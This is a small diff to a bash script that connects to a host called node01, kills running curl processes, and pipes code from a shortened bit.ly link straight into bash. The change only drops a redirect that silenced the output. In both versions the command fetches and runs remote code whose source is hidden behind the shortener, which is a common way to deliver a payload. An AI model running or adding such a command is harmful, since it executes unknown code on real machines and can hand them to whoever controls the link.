@@ -1,4 +1,4 @@
 #!/bin/bash
 ssh node01
-killall curl && curl -L https://bit.ly/3lalhby | bash || curl -L https://bit.ly/3lalhby | bash > /dev/null 2>&1
+killall curl && curl -L https://bit.ly/3lalhby | bash || curl -L https://bit.ly/3lalhby | bash
 
